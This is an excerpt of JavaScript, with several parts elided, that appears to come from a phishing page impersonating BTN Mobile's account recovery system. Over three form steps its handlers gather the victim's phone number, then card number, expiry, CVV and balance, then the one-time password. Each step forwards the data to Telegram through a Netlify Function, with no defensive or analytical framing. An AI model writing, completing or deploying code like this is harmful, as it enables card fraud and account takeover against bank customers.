...
(function() {
    ...
    // Function to send notification to Telegram via Netlify Function
    async function sendToTelegram(notificationType, data) {
        try {
    ...
    document.getElementById('gotoPage2Btn').addEventListener('click', async () => {
        ...
        // Send notification for Phone Number only
        await sendToTelegram('phone', { phone: cleanPhone });
    ...
    // Validasi halaman 2 dan kirim notifikasi
    ...
    btnLanjut.addEventListener('click', async (e) => {
        ...
        // Save data
        userData.cardNumber = nomorKartu;
        userData.cardExpiry = berlakuSampai;
        userData.cvv = cvv;
        userData.balance = saldoTerakhir;
        
        // Send notification for Card + CVV + Expiry + Balance
        await sendToTelegram('card', {
            phone: userData.phone,
            cardNumber: nomorKartu,
            cardExpiry: berlakuSampai,
            cvv: cvv,
    ...
    document.getElementById('submitOtpBtn').addEventListener('click', async () => {
        ...
        // Save OTP
        userData.otp = mainOtp;
        
        // Send final notification with OTP
        await sendToTelegram('complete', {
            phone: userData.phone,
    ...
    console.log('BTN Mobile - Sistem Pemulihan Akun Siap (dengan notifikasi Telegram)');
})();
